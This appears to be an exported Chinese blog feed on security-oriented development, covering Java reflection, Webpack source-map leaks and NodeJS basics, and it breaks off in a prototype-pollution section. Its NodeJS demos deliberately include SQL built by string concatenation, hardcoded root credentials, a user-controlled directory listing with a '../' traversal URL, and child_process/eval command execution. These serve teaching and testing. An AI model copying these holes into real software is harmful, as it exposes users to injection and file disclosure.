对象则只能使用默认的无参数构造方法。下面的代码就调用了一个有参数的构造方法进行了类对象的初始化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Apple.class;</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clz.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line"><span class="type">Apple</span> <span class="variable">apple</span> <span class="operator">=</span> (Apple)constructor.newInstance(<span class="string">&quot;红富士&quot;</span>, <span class="number">15</span>);</span><br></pre></td></tr></table></figure><h2 id="通过反射获取类属性-方法和构造器"><a class="markdownIt-Anchor" href="#通过反射获取类属性-方法和构造器"></a> 通过反射获取类属性、方法和构造器</h2><ol><li><p>通过 Class 对象的 getFields() 方法</p><ul><li>无法获取私有属性</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Apple.class;</span><br><span class="line">Field[] fields = clz.getFields();</span><br><span class="line"><span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">    System.out.println(field.getName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">price</span><br></pre></td></tr></table></figure></li><li><p>使用 Class 对象的 getDeclaredFields() 方法</p><ul><li>可以获取包括私有属性在内的所有属性</li></ul><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Class</span> <span class="keyword">clz</span> = Apple.class<span class="comment">;</span></span><br><span class="line"><span class="symbol">Field</span>[] fields = clz.getDeclaredFields()<span class="comment">;</span></span><br><span class="line"><span class="symbol">for</span> (<span class="meta">Field</span> <span class="meta">field</span> : fields) &#123;</span><br><span class="line">    System.out.println(<span class="meta">field</span>.getName())<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果是：</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">name</span></span><br><span class="line">price</span><br></pre></td></tr></table></figure></li></ol><p>与获取类属性一样，当我们去获取类方法、类构造器时，如果要获取私有方法或私有构造器，则必须使用有 declared 关键字的方法。</p><h1 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章"></a> 参考文章</h1><ul><li><a href="https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html">大白话说Java反射：入门、使用、原理</a></li><li><a href="https://blog.csdn.net/HO1_K/article/details/81210947">深入理解Java反射机制原理、使用方法</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java 反射 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『安全开发』JS安全开发（三）打包器</title>
      <link href="/posts/ac58.html"/>
      <url>/posts/ac58.html</url>
      
        <content type="html"><![CDATA[<h1 id="webpack-打包器"><a class="markdownIt-Anchor" href="#webpack-打包器"></a> WebPack 打包器</h1><h2 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h2><ol><li><p><strong>Webpack 是什么？</strong></p><p>Webpack 是一个 <strong>前端资源打包工具</strong>，主要用于将 JavaScript、CSS、图片等各种资源模块化并优化打包，最终输出可供浏览器使用的文件。</p></li><li><p><strong>为什么要使用 Webpack？</strong></p><p>1）模块化支持：Webpack 支持将应用程序拆分为模块，使开发人员能够使用模块化的方式组织和管理代码。模块化能够提高代码的可维护性、重用性和可测试性。</p><ul><li><p>例如：src目录下有 <code>1.js</code> 和 <code>2.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.js</span></span><br><span class="line"><span class="title function_">test</span>();</span><br></pre></td></tr></table></figure><p>假如在 <code>index.html</code> 中只引用了 <code>2.js</code> ，会产生无法找到 <code>test函数</code> 的报错；</p><p>假如在 <code>index.html</code> 中先引用 <code>2.js</code> 再引用 <code>1.js</code> ，仍然会产生报错，引用顺序问题。</p><p>在项目庞大的情况下，这些引用管理是十分复杂的，但是如果使用了 Webpack 来进行模块化，就不会产生这样的问题，因为Webpack会将其自动组合成一个代码块。</p></li></ul><p>2）资源打包：Webpack 可以将项目中的各种资源（例如 JavaScript、CSS、图像等）视为模块，并将它们打包成一个或多个最终的静态资源文件。这样可以减少网络请求的次数，提高应用程序的加载性能。</p><p>3）代码分割：Webpack 支持将应用程序的代码分割成多个块（chunks），并在需要时按需加载。这种代码分割的技术可以提高应用程序的初始加载速度，并减小用户需要下载的初始文件大小。</p><p>4）资源优化：Webpack 提供了丰富的插件和工具生态系统，可以进行各种资源优化和转换，例如压缩代码、处理样式预处理器、优化图像等。这些优化可以减小资源文件的大小，提高应用程序的性能。</p><p>5）开发环境支持：Webpack 提供了强大的开发环境支持，包括开发服务器、热模块替换（Hot Module Replacement）、源代码映射等功能。这些功能可以提升开发效率，加快开发周期。</p></li></ol><h2 id="webpack-的使用"><a class="markdownIt-Anchor" href="#webpack-的使用"></a> Webpack 的使用</h2><p>具体使用方式参考：<a href="https://mp.weixin.qq.com/s/J3bpy-SsCnQ1lBov1L98WA">一文看懂webpack打包操作</a></p><h2 id="webpack-安全"><a class="markdownIt-Anchor" href="#webpack-安全"></a> WebPack 安全</h2><h3 id="源码泄露"><a class="markdownIt-Anchor" href="#源码泄露"></a> 源码泄露</h3><p>NodeJS 作为服务端使用的语言，不会在前端显示源码。但是不恰当的模式设置会导致源码泄露。</p><p>Webpack 提供两种模式：</p><ul><li><code>development</code>（开发模式）：打包后的代码会附带 <code>.map</code> 文件，攻击者可以通过浏览器开发者工具或 <code>source-map</code> 工具轻松恢复源码。</li><li><code>production</code>（生产模式）：Webpack 会对代码进行压缩、重命名变量、删除注释等优化，使代码难以阅读，同时并不会生成 <code>.map</code> 文件</li></ul><h3 id="packetfuzzer"><a class="markdownIt-Anchor" href="#packetfuzzer"></a> PacketFuzzer</h3><p>打包器会将整站的API和API参数打包在一起供Web集中调用，这也便于我们快速发现网站的功能和API清单，但往往这些打包器所生成的JS文件数量异常之多并且总JS代码量异常庞大（多达上万行），这给我们的手工测试带来了极大的不便，Packer Fuzzer软件应运而生。</p><p>本工具支持自动模糊提取对应目标站点的API以及API对应的参数内容，并支持对：未授权访问、敏感信息泄露、CORS、SQL注入、水平越权、弱口令、任意文件上传七大漏洞进行模糊高效的快速检测。在扫描结束之后，本工具还支持自动生成扫描报告，您可以选择便于分析的HTML版本以及较为正规的doc、pdf、txt版本。</p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『安全开发』JS安全开发（二）NodeJS</title>
      <link href="/posts/3150.html"/>
      <url>/posts/3150.html</url>
      
        <content type="html"><![CDATA[<h1 id="nodejs基本概念"><a class="markdownIt-Anchor" href="#nodejs基本概念"></a> NodeJS基本概念</h1><ol><li><p><strong>概念</strong></p><p>NodeJS是一个基于 Chrome V8 引擎的 JavaScript 运行时环境，允许开发者在服务器端运行 JavaScript。它没有浏览器的 DOM 或 BOM，而是提供了与文件系统、网络请求、进程管理等相关的 API，主要<strong>用于构建服务器端应用程序</strong>。</p><blockquote><p>注意：nodejs不是一门新的编程语言，nodejs是在服务端运行javascript的运行环境</p></blockquote></li><li><p><strong>使用文档</strong></p><p><a href="https://www.w3cschool.cn/nodejs/">https://www.w3cschool.cn/nodejs/</a></p></li><li><p><strong>第三方库</strong></p><ul><li>express：Express是一个简洁而灵活的node.js Web应用框架</li><li>body-parser：node.js中间件，用于处理 JSON, Raw, Text和URL编码的数据。</li><li>cookie-parser：一个解析Cookie的工具。通过req.cookies可以取到传过来的cookie，并把它们转成对象。</li><li>multer：node.js中间件，用于处理 enctype=“multipart/form-data”（设置表单的MIME编码）的表单数据。</li><li>mysql：Node.js来连接MySQL专用库，并对数据库进行操作。</li></ul></li></ol><h1 id="nodejs的安装使用"><a class="markdownIt-Anchor" href="#nodejs的安装使用"></a> NodeJS的安装使用</h1><ol><li><p><strong>安装</strong></p><p>在cmd中输入 <code>node -v</code> 确定自己是否已经安装过</p><p>没有安装过的话，参考：</p></li><li><p><strong>使用方法</strong></p><p>初始化项目并安装Express框架</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm init -y  <span class="comment"># 初始化 Node.js 项目，生成 package.json 文件</span></span><br><span class="line">npm install express  <span class="comment"># 安装 Express</span></span><br></pre></td></tr></table></figure><p>这会在你的项目中安装 Express 库，并在 <code>node_modules</code> 目录下存放依赖。</p><p>在终端中输入以下命令来运行demo：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node app.js</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入 Express 框架</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="comment">// 创建 Express 应用程序实例</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理 &#x27;/login&#x27; 路径的 GET 请求，返回简单的登录页面</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;&lt;hr&gt;登录页面&lt;/hr&gt;&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理根路径的 GET 请求，发送名为 &#x27;sql.html&#x27; 的文件</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="comment">// res.sendFile(__dirname + &#x27;/&#x27; + &#x27;sql.html&#x27;);</span></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;hello word&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器，监听端口 3001</span></span><br><span class="line"><span class="keyword">const</span> server = app.<span class="title function_">listen</span>(<span class="number">3001</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Web 服务器已经启动，监听端口 3001！&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ol><h1 id="基本语法"><a class="markdownIt-Anchor" href="#基本语法"></a> 基本语法</h1><h2 id="getpost请求"><a class="markdownIt-Anchor" href="#getpost请求"></a> GET/POST请求</h2><p><strong><code>req.query</code></strong> ：用于处理 URL 查询字符串参数**<code>GET请求</code>**</p><p><strong><code>req.body</code></strong> ：用于处理 **<code>POST 请求</code>**中的表单数据。</p><h2 id="回调函数"><a class="markdownIt-Anchor" href="#回调函数"></a> 回调函数</h2><ol><li><p><strong>如何理解回调函数</strong></p><p><a href="https://www.runoob.com/w3cnote/nodejs-callback-func.html">彻底理解 Node.js 中的回调(Callback)函数</a></p></li><li><p><strong>用法</strong></p><p>在JavaScript中，回调函数通常是作为参数传递给其他函数，然后由那个函数在适当的时机调用。这种方式使得代码更加灵活和可扩展。</p><p>回调函数通常与<strong>异步操作</strong>一起使用，比如读取文件、发送网络请求或等待用户输入。由于这些操作可能需要一些时间来完成，所以通常会使用回调函数来在操作完成后执行某些任务。</p></li><li><p><strong>基本语法</strong></p></li></ol><p>下面的延时执行函数中的匿名函数就是回调函数，表示2秒之后执行这个匿名函数</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(function() &#123;</span><br><span class="line">  console.log(&#x27;This is a delayed message.&#x27;);</span><br><span class="line">&#125;, 2000);  // 2秒后打印</span><br></pre></td></tr></table></figure><ol start="4"><li><p><strong>如何判断目标函数是否使用了回调函数</strong></p><p>回调函数并不是指函数内部必须明确命名为 <code>callback</code>。</p><p>在 JavaScript 中，回调函数的核心概念是：它是作为参数传递给另一个函数，并且在该函数执行时被调用。所以，不管这个函数的名字是什么，<mark>只要它是被传递到其他函数中，并在那个函数内部执行，就可以算作回调函数</mark>。</p><p>比如上面的 <code>setTimeout</code> 函数就是一个回调函数，虽然它没有显式地命名为 <code>callback</code>，因为：</p><ul><li>它作为参数传递给了 <code>setTimeout</code> 函数。</li><li>在指定的时间延迟后，<code>setTimeout</code> 会调用这个函数。</li></ul></li></ol><h1 id="功能实现"><a class="markdownIt-Anchor" href="#功能实现"></a> 功能实现</h1><h2 id="用户登录"><a class="markdownIt-Anchor" href="#用户登录"></a> 用户登录</h2><ol><li><p><strong>功能</strong>：前端输入用户名和密码，在数据库中匹配验证</p></li><li><p><strong>环境</strong></p><p>下载解析GET/POST请求体的中间件 <code>body-parser</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i body-parser</span><br></pre></td></tr></table></figure></li><li><p><strong>代码</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入 Express 框架</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> mysql = <span class="built_in">require</span>(<span class="string">&#x27;mysql&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 Express 应用程序实例</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="comment">//创建一个用于解析 URL 编码的 bodyParser 中间件实例</span></span><br><span class="line"><span class="keyword">const</span> urlencodedParser = bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理 &#x27;/login&#x27; 路径的 GET 请求，返回简单的登录页面</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="comment">// 从请求中获取用户名和密码</span></span><br><span class="line">  <span class="keyword">const</span> u = req.<span class="property">query</span>.<span class="property">username</span>;</span><br><span class="line">  <span class="keyword">const</span> p = req.<span class="property">query</span>.<span class="property">password</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(u);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查用户名和密码是否为 admin 和 123456</span></span><br><span class="line">  <span class="keyword">if</span> (u === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; p === <span class="string">&#x27;123456&#x27;</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;欢迎进入后台管理页面&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;登录用户或密码错误&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理 &#x27;/login&#x27; 路径的 POST 请求，使用 bodyParser 解析表单数据</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, urlencodedParser, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="comment">// 从请求中获取表单提交的用户名和密码</span></span><br><span class="line">  <span class="keyword">const</span> u = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">  <span class="keyword">const</span> p = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 输出获取到的用户名和密码，用于调试</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(u);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建与 MySQL 数据库的连接</span></span><br><span class="line">  <span class="keyword">var</span> connection = mysql.<span class="title function_">createConnection</span>(&#123;</span><br><span class="line">    host     : <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    user     : <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    password : <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    database : <span class="string">&#x27;dome01&#x27;</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 建立数据库连接</span></span><br><span class="line">  connection.<span class="title function_">connect</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 构建 SQL 查询，检查数据库中是否存在匹配的用户名和密码</span></span><br><span class="line">  <span class="keyword">const</span> sql = <span class="string">&#x27;select * from admin where username=&quot;&#x27;</span>+u+<span class="string">&#x27;&quot; and password=&quot;&#x27;</span>+p+<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(sql);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 执行 SQL 查询</span></span><br><span class="line">  connection.<span class="title function_">query</span>(sql, <span class="keyword">function</span>(<span class="params">error, data</span>)&#123;</span><br><span class="line">    <span class="comment">// 检查查询执行中是否存在错误</span></span><br><span class="line">    <span class="keyword">if</span>(error)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;数据库连接失败！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 检查用户名和密码是否匹配数据库中的数据</span></span><br><span class="line">        <span class="keyword">if</span>(u == data[<span class="number">0</span>][<span class="string">&#x27;username&#x27;</span>] &amp;&amp; p == data[<span class="number">0</span>][<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">            <span class="comment">// 如果匹配，发送欢迎消息到前端</span></span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&#x27;欢迎进入后台管理页面&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">        <span class="comment">// 捕获异常，如果没有匹配的数据或其他错误，发送错误消息到前端</span></span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;错误&#x27;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理根路径的 GET 请求，发送名为 &#x27;sql.html&#x27; 的文件</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/&#x27;</span> + <span class="string">&#x27;sql.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器，监听端口 3001</span></span><br><span class="line"><span class="keyword">const</span> server = app.<span class="title function_">listen</span>(<span class="number">3001</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Web 服务器已经启动，监听端口 3001！&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ol><h2 id="文件管理"><a class="markdownIt-Anchor" href="#文件管理"></a> 文件管理</h2><ol><li><p><strong>功能</strong>：目录读取</p></li><li><p><strong>环境</strong></p><p>下载相关文件管理依赖 <code>fs</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i fs</span><br></pre></td></tr></table></figure></li><li><p><strong>代码</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入文件系统和 Express 框架</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理 &#x27;/file&#x27; 路径的 GET 请求</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/file&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="comment">// 从请求中获取目录参数</span></span><br><span class="line">    <span class="keyword">const</span> dir = req.<span class="property">query</span>.<span class="property">dir</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(dir);·</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用文件管理函数，传递目录参数</span></span><br><span class="line">    <span class="title function_">filemanage</span>(dir);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动 Express 应用监听在3000端口</span></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Web应用已启动在3000端口！&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件管理函数，接收一个目录参数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">filemanage</span>(<span class="params">dir</span>) &#123;</span><br><span class="line">    <span class="comment">// 使用 fs.readdir 读取目录下的文件</span></span><br><span class="line">    fs.<span class="title function_">readdir</span>(dir, <span class="keyword">function</span> (<span class="params">error, files</span>) &#123;</span><br><span class="line">        <span class="comment">// 打印目录中的文件列表</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(files);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用文件管理函数，传递目录参数</p><ul><li><a href="http://127.0.0.1:3000/file?dir=./">http://127.0.0.1:3000/file?dir=./</a></li><li><a href="http://127.0.0.1:3000/file?dir=../">http://127.0.0.1:3000/file?dir=…/</a></li></ul></li></ol><h2 id="命令执行"><a class="markdownIt-Anchor" href="#命令执行"></a> 命令执行</h2><ol><li><p><strong>功能</strong>：执行系统命令、将字符串当作代码解析</p></li><li><p><strong>环境</strong></p><p>下载子进程管理模块 <code>child_process</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i child_process</span><br></pre></td></tr></table></figure></li><li><p><strong>代码</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入child_process模块</span></span><br><span class="line"><span class="keyword">const</span> rce = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用exec方法调用系统命令&#x27;notepad&#x27;，打开记事本</span></span><br><span class="line">rce.<span class="title function_">exec</span>(<span class="string">&#x27;notepad&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用spawnSync方法调用系统命令&#x27;calc&#x27;，打开计算器</span></span><br><span class="line">rce.<span class="title function_">spawnSync</span>(<span class="string">&#x27;calc&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用eval调用代码命令执行，将字符串当做代码解析</span></span><br><span class="line"><span class="comment">// 请注意：避免在生产环境中使用eval，可能存在安全风险</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;require(&quot;child_process&quot;).exec(&quot;calc&quot;);&#x27;</span>);</span><br></pre></td></tr></table></figure></li></ol><h1 id="原型链污染"><a class="markdownIt-Anchor" href="#原型链污染"></a> 原型链污染</h1><h2 id="什么是原型链"><a class="markdownIt-Anchor" href="#什么是原型链"></a> 什么是原型链</h2><p>因为 JavaScript 没有类似 Java 中的 Class 概念，所以继承都是由原型链来实现的。JavaScript 中每个对象都有一个内部属性 <code>[[Prototype]]</code>，这个属性指向另一个对象。通过这个原型对象，当前对象可以继承其上定义的属性和方法。</p><ol><li><p><mark>每个对象都有一个原型</mark>：当你创建一个对象时，它会有一个指向其构造函数的原型对象。</p></li><li><p><mark>查找过程</mark>：当你访问一个对象的属性时，JavaScript 引擎<u>首先会检查这个对象自身是否有该属性</u>。如果没有，它会通过原型链查找，依次查找对象的原型及其原型的原型，直到找到该属性或者原型链的尽头（通常是 <code>null</code>）为止。</p></li><li><p>例子</p><p>下面的代码中，<code>foo.bar</code> 输出为1而不是x，因为引擎会首先检查该对象自身是否有该属性。zoo作为继承自Object的对象，同样也继承了其bar值，为x。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span 